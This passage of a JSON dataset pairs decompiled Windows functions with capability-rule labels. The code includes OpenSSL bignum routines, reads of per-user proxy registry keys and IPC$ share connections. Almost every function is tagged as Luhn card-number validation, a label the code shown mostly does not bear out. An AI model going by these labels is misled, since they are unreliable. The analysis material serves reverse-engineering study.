(**(iVar2 + 0x10))(*ptr, 0);\n        (**(iVar2 + 0x14))(*ptr, 0);\n        *ptr = 0;\n        return 0x21590004;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0x200470c4);\n    return 0;\n}\n",
        "token_count": 688
    },
    "200228fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.200228fc(void)\n\n{\n    int32_t *in_EAX;\n    \n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(*in_EAX + 0xc);\n    return;\n}\n",
        "token_count": 46
    },
    "20022b15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20022b15(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (arg_8h == NULL) {\n        iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        iVar2 = fcn.200229da();\n        if (iVar2 == 0) {\n            if ((***arg_8h < 0x25) || (pcVar1 = (**arg_8h)[9],  pcVar1 == NULL)) {\n                fcn.20022909();\n                iVar2 = 0x21590001;\n            }\n            else {\n                iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.20022909();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 279
    },
    "20022cfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20022cfb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    iVar1 = fcn.20022aa3(arg_ch, arg_14h, arg_18h, arg_1ch);\n    if (iVar1 == 0x21590001) {\n        arg_ch_00 = fcn.20012f52(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.20022a23(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h, arg_18h, arg_1ch);\n            (*_sym.imp.msvcrt.dll_free)(arg_ch_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 237
    },
    "20023113": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20023113(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (arg_8h == NULL) {\n        iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        iVar2 = fcn.20022fde();\n        if (iVar2 == 0) {\n            if ((***arg_8h < 0x31) || (pcVar1 = (**arg_8h)[0xc],  pcVar1 == NULL)) {\n                fcn.20022f3c();\n                iVar2 = 0x21590001;\n            }\n            else {\n                iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.20022f3c();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 284
    },
    "2002344f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2002344f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.200233fe(arg_ch, arg_10h);\n    if (iVar1 == 0x21590001) {\n        iVar2 = fcn.20012f52(arg_ch, &var_4h);\n        if (iVar2 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.20023291(arg_8h, iVar2, var_4h, arg_10h);\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "200237e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.200237e9(uint param_1, uint *param_2)\n\n{\n    *param_2 = 0;\n    param_2[1] = 0;\n    (*_sym.imp.ntdll.dll_sscanf)(param_1, \"%x.%x\", param_2, param_2 + 1);\n    return 1;\n}\n",
        "token_count": 78
    },
    "2002395a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2002395a(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = (*_sym.imp.msvcrt.dll_malloc)(0x1a);\n    if (arg_8h_00 != 0) {\n        fcn.2002380e(arg_8h_00);\n        pcVar2 = _sym.imp.WS2_32.dll_htonl;\n        var_8h = (*_sym.imp.WS2_32.dll_htonl)(*arg_8h);\n        var_4h = (*pcVar2)(arg_8h[1]);\n        uVar4 = 0;\n        do {\n            puVar1 = &var_8h + uVar4;\n            *puVar1 = *puVar1 ^ puVar1[arg_8h_00 - &var_8h];\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 8);\n        iVar3 = fcn.2000130b(&var_8h, arg_8h_00 + 10, 8);\n        *(arg_ch + 8) = iVar3 + 10;\n        *(arg_ch + 4) = arg_8h_00;\n        arg_8h_00 = 1;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 357
    },
    "20023b61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20023b61(uint *arg_8h, int32_t **arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    int32_t size;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyA)(0x80000003, 0, 0, 0, &var_8h, &size, 0, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        iVar1 = size + 9;\n        size = size + 1;\n        piVar2 = (*_sym.imp.msvcrt.dll_malloc)(iVar1);\n        if (piVar2 == NULL) {\n            return 0x21590004;\n        }\n        piVar2[1] = size;\n        *piVar2 = piVar2 + 2;\n        *arg_8h = var_8h;\n        *arg_ch = piVar2;\n    }\n    return 0;\n}\n",
        "token_count": 235
    },
    "20023c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20023c34(uint *lpName, uint dwIndex, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint hKey;\n    \n    puVar2 = lpName;\n    uVar1 = *lpName;\n    lpName = lpName[1];\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyExA)(0x80000003, dwIndex, uVar1, &lpName, 0, 0, 0, 0);\n    if (iVar3 == 0) {\n        lpName = lpName + 0x3d;\n        iVar4 = (*_sym.imp.msvcrt.dll_malloc)(lpName);\n        if (iVar4 == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            fcn.200088de(\"%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\", *puVar2);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000003, iVar4, 0, 0x20019, &hKey);\n            (*_sym.imp.msvcrt.dll_free)(iVar4);\n            if (iVar3 == 0) {\n                fcn.20023bd0(hKey, \"ProxyServer\");\n                fcn.20023bd0(hKey, \"ProxyOverride\");\n                fcn.20023bd0(hKey, \"User Agent\");\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                iVar3 = 0;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 387
    },
    "20023f0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20023f0e(char *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint s1;\n    uint s;\n    uint var_1ch;\n    uint var_10h;\n    uint *var_ch;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ntdll.dll_strstr)(arg_8h, \"\\\\pipe\\\\\");\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    iVar1 = iVar1 - arg_8h;\n    if (((0xff < iVar1 + 1U) || (*arg_8h != '\\\\')) || (arg_8h[1] != '\\\\')) {\n        return 0x21590065;\n    }\n    if ((arg_8h[3] == '.') && (arg_8h[4] == '\\0')) {\n        return 0;\n    }\n    sub.ntdll.dll_memcpy(&s1, arg_8h, iVar1);\n    *(&s1 + iVar1) = 0;\n    sub.ntdll.dll_strcat(&s1, \"\\\\ipc$\");\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"MPR.dll\");\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return uVar2;\n    }\n    if (arg_ch == 0) {\n        sub.ntdll.dll_memset(&s, 0, 0x20);\n        var_ch = &s1;\n        var_1ch = 0;\n        var_10h = 0;\n        var_4h = 0;\n        if ((arg_10h != 0) && (iVar3 = sub.ntdll.dll_strcmp(arg_10h, 0x2002d628),  iVar3 == 0)) {\n            arg_10h = 0;\n        }\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"WNetAddConnection2A\");\n        if (pcVar4 != NULL) {\n            uVar2 = (*pcVar4)(&s, arg_14h, arg_10h, 0);\n            goto code_r0x20024037;\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"WNetCancelConnection2A\");\n        if (pcVar4 != NULL) {\n            uVar2 = (*pcVar4)(&s1, 0, 0);\n            goto code_r0x20024037;\n        }\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x20024037:\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 652
    },
    "20024062": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * fcn.20024062(int32_t param_1)\n\n{\n    uint *arg_ch;\n    int32_t iVar1;\n    \n    arg_ch = (*_sym.imp.msvcrt.dll_calloc)(1, 0x48);\n    if (arg_ch == NULL) {\n        arg_ch = NULL;\n    }\n    else {\n        if (param_1 == 0) {\n            param_1 = fcn.2002404e();\n        }\n        arg_ch[0xe] = 1;\n        arg_ch[0x11] = param_1;\n        *arg_ch = 0;\n        arg_ch[1] = 0;\n        arg_ch[2] = 0;\n        arg_ch[3] = 0;\n        arg_ch[4] = 0;\n        arg_ch[5] = 0;\n        arg_ch[6] = 0;\n        arg_ch[9] = 0;\n        arg_ch[10] = 0;\n        arg_ch[0xb] = 0;\n        arg_ch[0xc] = 0;\n        arg_ch[0xd] = 0;\n        arg_ch[8] = 0;\n        arg_ch[7] = *(param_1 + 0x18);\n        fcn.200259b0(*0x2004710c, arg_ch, arg_ch + 0xf);\n        if ((*(arg_ch[0x11] + 0x10) != NULL) && (iVar1 = (**(arg_ch[0x11] + 0x10))(arg_ch),  iVar1 == 0)) {\n            fcn.20025946(*0x2004710c, arg_ch, arg_ch + 0xf);\n            (*_sym.imp.msvcrt.dll_free)(arg_ch);\n            arg_ch = NULL;\n        }\n    }\n    return arg_ch;\n}\n",
        "token_count": 403
    },
    "20024102": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20024102(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (param_1 != 0) {\n        iVar2 = fcn.20025b79(param_1 + 0x38, 0xffffffff, 0x18, \"..\\\\libs\\\\ce\\\\openssl\\\\dh\\\\dh_lib.c\", 0x8b);\n        if (iVar2 < 1) {\n            pcVar1 = *(*(param_1 + 0x44) + 0x14);\n            if (pcVar1 != NULL) {\n                (*pcVar1)(param_1);\n            }\n            fcn.20025946(*0x2004710c, param_1, param_1 + 0x3c);\n            if (*(param_1 + 8) != 0) {\n                fcn.200244ae(*(param_1 + 8));\n            }\n            if (*(param_1 + 0xc) != 0) {\n                fcn.200244ae(*(param_1 + 0xc));\n            }\n            if (*(param_1 + 0x24) != 0) {\n                fcn.200244ae(*(param_1 + 0x24));\n            }\n            if (*(param_1 + 0x28) != 0) {\n                fcn.200244ae(*(param_1 + 0x28));\n            }\n            pcVar1 = _sym.imp.msvcrt.dll_free;\n            if (*(param_1 + 0x2c) != 0) {\n                (*_sym.imp.msvcrt.dll_free)(*(param_1 + 0x2c));\n            }\n            if (*(param_1 + 0x34) != 0) {\n                fcn.200244ae(*(param_1 + 0x34));\n            }\n            if (*(param_1 + 0x14) != 0) {\n                fcn.200244ae(*(param_1 + 0x14));\n            }\n            if (*(param_1 + 0x18) != 0) {\n                fcn.200244ae(*(param_1 + 0x18));\n            }\n            (*pcVar1)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 494
    },
    "200241cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.200241cd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.20024488(*(param_1 + 8));\n    return iVar1 + 7 + (iVar1 + 7 >> 0x1f & 7U) >> 3;\n}\n",
        "token_count": 74
    },
    "200241fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.200241fd(uint param_1, uint param_2, int32_t param_3)\n\n{\n    (**(*(param_3 + 0x44) + 8))(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 58
    },
    "20024535": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20024535(uint param_1)\n\n{\n    sub.ntdll.dll_memset(param_1, 0, 0x14);\n    return;\n}\n",
        "token_count": 37
    },
    "2002466f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.2002466f(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_4h;\n    \n    if (arg_8h == arg_ch) {\n        return arg_8h;\n    }\n    puVar4 = arg_8h;\n    if (arg_8h[2] < arg_ch[1]) {\n        puVar4 = fcn.2002456e(arg_8h, arg_ch[1]);\n    }\n    if (puVar4 == NULL) {\n        return NULL;\n    }\n    puVar4 = *arg_8h;\n    puVar5 = *arg_ch;\n    for (iVar6 = arg_ch[1] >> 2; 0 < iVar6; iVar6 = iVar6 + -1) {\n        uVar1 = puVar5[3];\n        uVar2 = puVar5[2];\n        uVar3 = *puVar5;\n        puVar4[1] = puVar5[1];\n        *puVar4 = uVar3;\n        puVar4[2] = uVar2;\n        puVar4[3] = uVar1;\n        puVar4 = puVar4 + 4;\n        puVar5 = puVar5 + 4;\n    }\n    uVar7 = arg_ch[1] & 3;\n    if (uVar7 != 1) {\n        if (uVar7 != 2) {\n            if (uVar7 != 3) goto code_r0x200246f8;\n            puVar4[2] = puVar5[2];\n        }\n        puVar4[1] = puVar5[1];\n    }\n    *puVar4 = *puVar5;\ncode_r0x200246f8:\n    iVar6 = arg_ch[1];\n    arg_8h[1] = iVar6;\n    if ((iVar6 == 0) && (*arg_8h != NULL)) {\n        **arg_8h = 0;\n    }\n    arg_8h[3] = arg_ch[3];\n    return arg_8h;\n}\n",
        "token_count": 507
    },
    "20024825": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20024825(int32_t *arg_8h, uchar *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.20024488(arg_8h);\n    uVar2 = iVar1 + 7 + (iVar1 + 7 >> 0x1f & 7U) >> 3;\n    uVar3 = uVar2;\n    while (0 < uVar3) {\n        uVar3 = uVar3 - 1;\n        *arg_ch = *(*arg_8h + (uVar3 + (uVar3 >> 0x1f & 3U) >> 2) * 4) >> ((uVar3 & 0x80000003) << 3);\n        arg_ch = arg_ch + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 211
    },
    "20025836": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20025836(uint param_1, uint param_2, ulong param_3)\n\n{\n    if (*0x20046b44 != 0) {\n        (**(*0x20046b44 + 0xc))(param_1, param_2, param_3);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "2002588f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2002588f(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.ntdll.dll_strtoul)(param_2, 0, 0);\n    *(param_1 + 0xc) = uVar1;\n    return;\n}\n",
        "token_count": 74
    },
    "20025ab9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20025ab9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = NULL;\n    if (param_1 != 0) {\n        param_1 = -1 - param_1;\n    }\n    fcn.20025b2f(9, 0x1b, \"..\\\\libs\\\\ce\\\\openssl\\\\cryptlib.c\", 0x11e);\n    if (*0x20047144 != 0) {\n        iVar1 = fcn.20027396(*0x20047144);\n        if (param_1 < iVar1) {\n            piVar2 = fcn.200273a5(*0x20047144, param_1);\n            if (piVar2 != NULL) {\n                *piVar2 = *piVar2 + 1;\n            }\n        }\n    }\n    fcn.20025b2f(10, 0x1b, \"..\\\\libs\\\\ce\\\\openssl\\\\cryptlib.c\", 0x125);\n    if (piVar2 == NULL) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = piVar2[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 273
    },
    "20025b79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20025b79(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    if (*0x2004714c == NULL) {\n        fcn.20025b2f(9, arg_10h, arg_14h, arg_18h);\n        arg_ch = *arg_8h + arg_ch;\n        *arg_8h = arg_ch;\n        fcn.20025b2f(10, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        arg_ch = (**0x2004714c)(arg_8h, arg_ch);\n    }\n    return arg_ch;\n}\n",
        "token_count": 170
    },
    "20025bc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20025bc7(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0;\n    param_1[0x51] = 0;\n    param_1[0x52] = 0;\n    param_1[0x5f] = 0;\n    param_1 = param_1 + 1;\n    iVar1 = 0x10;\n    do {\n        fcn.20024535(param_1);\n        param_1 = param_1 + 5;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 144
    },
    "20025f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20025f00(uint *param_1)\n\n{\n    *param_1 = 0;\n    fcn.20024535(param_1 + 1);\n    fcn.20024535(param_1 + 6);\n    fcn.20024535(param_1 + 0xb);\n    param_1[0x11] = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "2002607e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002607e(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    fcn.20025c2c(arg_18h);\n    iVar1 = fcn.20025c4b(arg_18h);\n    iVar2 = fcn.20025c4b(arg_18h);\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        if (arg_ch == arg_10h) {\n            iVar2 = fcn.2002c53b(iVar1, arg_ch, arg_18h);\n        }\n        else {\n            iVar2 = fcn.2002c08d(iVar1, arg_ch, arg_10h, arg_18h);\n        }\n        if (iVar2 != 0) {\n            iVar1 = fcn.20025ce5(arg_8h, iVar1, arg_14h, arg_18h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n    }\n    fcn.20025c80(arg_18h);\n    return uVar3;\n}\n",
        "token_count": 294
    },
    "2002627e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2002627e(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.2002611a(0, param_1, param_3, param_4);\n    return;\n}\n",
        "token_count": 57
    },
    "20026299": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20026299(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.2002611a(1, param_1, param_3, param_4);\n    return;\n}\n",
        "token_count": 56
    },
    "2002639b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002639b(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    fcn.20025c2c(arg_18h);\n    iVar1 = fcn.20025c4b(arg_18h);\n    if (iVar1 != 0) {\n        if (arg_ch == arg_10h) {\n            iVar2 = fcn.2002c53b(iVar1, arg_ch, arg_18h);\n        }\n        else {\n            iVar2 = fcn.2002c08d(iVar1, arg_ch, arg_10h, arg_18h);\n        }\n        if (iVar2 != 0) {\n            iVar1 = fcn.2002b2da(arg_8h, iVar1, arg_14h, arg_18h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n    }\n    fcn.20025c80(arg_18h);\n    return uVar3;\n}\n",
        "token_count": 270
    },
    "200269ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200269ea(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t **unaff_ESI;\n    uint uVar2;\n    \n    iVar1 = fcn.20026405(unaff_ESI, unaff_ESI, arg_10h, arg_8h, arg_18h, arg_1ch);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = 1;\n    if ((unaff_ESI[1] == 0x1) && (**unaff_ESI == 1)) {\ncode_r0x20026a1b:\n        uVar2 = 0;\n    }\n    else {\n        do {\n            iVar1 = fcn.200248c4(unaff_ESI, arg_ch);\n            if (iVar1 == 0) goto code_r0x20026a1b;\n            arg_14h = arg_14h + -1;\n            if (arg_14h == 0) {\n                return 1;\n            }\n            iVar1 = fcn.2002639b(unaff_ESI, unaff_ESI, unaff_ESI, arg_8h, arg_18h);\n            if (iVar1 == 0) {\n                return 0xffffffff;\n            }\n        } while ((unaff_ESI[1] != 0x1) || (**unaff_ESI != 1));\n    }\n    return uVar2;\n}\n",
        "token_count": 352
    },
    "200273d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200273d1(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_14h;\n    int32_t arg_ch_00;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint var_4h;\n    \n    piVar3 = arg_10h;\n    if (arg_ch[1] < arg_10h[1]) {\n        arg_10h = arg_ch;\n        arg_ch = piVar3;\n    }\n    arg_14h = arg_10h[1];\n    iVar5 = arg_ch[1];\n    piVar3 = arg_8h;\n    if (arg_8h[2] < iVar5 + 1) {\n        piVar3 = fcn.2002456e(arg_8h, iVar5 + 1);\n    }\n    if (piVar3 == NULL) {\n        return 0;\n    }\n    arg_8h[1] = iVar5;\n    arg_ch_00 = *arg_ch;\n    arg_8h_00 = *arg_8h;\n    iVar4 = fcn.20027c53(arg_8h_00, arg_ch_00, *arg_10h, arg_14h);\n    puVar7 = arg_8h_00 + arg_14h * 4;\n    puVar6 = arg_ch_00 + arg_14h * 4;\n    arg_10h = arg_14h;\n    if (iVar4 != 0) {\n        if (arg_14h < iVar5) {\n            do {\n                uVar2 = *puVar6;\n                arg_10h = arg_10h + 1;\n                uVar1 = uVar2 + 1;\n                *puVar7 = uVar1;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n                if (uVar2 <= uVar1) {\n                    iVar4 = 0;\n                    break;\n                }\n            } while (arg_10h < iVar5);\n            if (arg_10h < iVar5) goto code_r0x20027485;\n        }\n        if (iVar4 != 0) {\n            *puVar7 = 1;\n            puVar7 = puVar7 + 1;\n            arg_8h[1] = arg_8h[1] + 1;\n        }\n    }\ncode_r0x20027485:\n    if ((puVar7 != puVar6) && (arg_10h < iVar5)) {\n        iVar5 = iVar5 - arg_10h;\n        do {\n            *puVar7 = *puVar6;\n            puVar7 = puVar7 + 1;\n            puVar6 = puVar6 + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    return 1;\n}\n",
        "token_count": 704
    },
    "200275cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200275cc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h_00;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*(arg_ch + 0xc) == 0) {\n        iVar3 = arg_ch;\n        arg_10h_00 = arg_10h;\n        if (*(arg_10h + 0xc) != 0) goto code_r0x2002760c;\n    }\n    else {\n        iVar3 = arg_10h;\n        arg_10h_00 = arg_ch;\n        if (*(arg_10h + 0xc) == 0) {\n            uVar4 = 1;\ncode_r0x2002760c:\n            iVar3 = fcn.200273d1(arg_8h, arg_ch, arg_10h);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            *(arg_8h + 0xc) = uVar4;\n            return 1;\n        }\n    }\n    iVar2 = *(iVar3 + 4);\n    if (*(iVar3 + 4) <= *(arg_10h_00 + 4)) {\n        iVar2 = *(arg_10h_00 + 4);\n    }\n    iVar1 = arg_8h;\n    if (*(arg_8h + 8) < iVar2) {\n        iVar1 = fcn.2002456e(arg_8h, iVar2);\n    }\n    if (iVar1 != 0) {\n        iVar2 = fcn.20024882(iVar3, arg_10h_00);\n        if (iVar2 < 0) {\n            iVar3 = fcn.200274a9(arg_8h, arg_10h_00, iVar3);\n            if (iVar3 != 0) {\n                *(arg_8h + 0xc) = 1;\n                return 1;\n            }\n        }\n        else {\n            iVar3 = fcn.200274a9(arg_8h, iVar3, arg_10h_00);\n            if (iVar3 != 0) {\n                *(arg_8h + 0xc) = 0;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 534
    },
    "20027674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
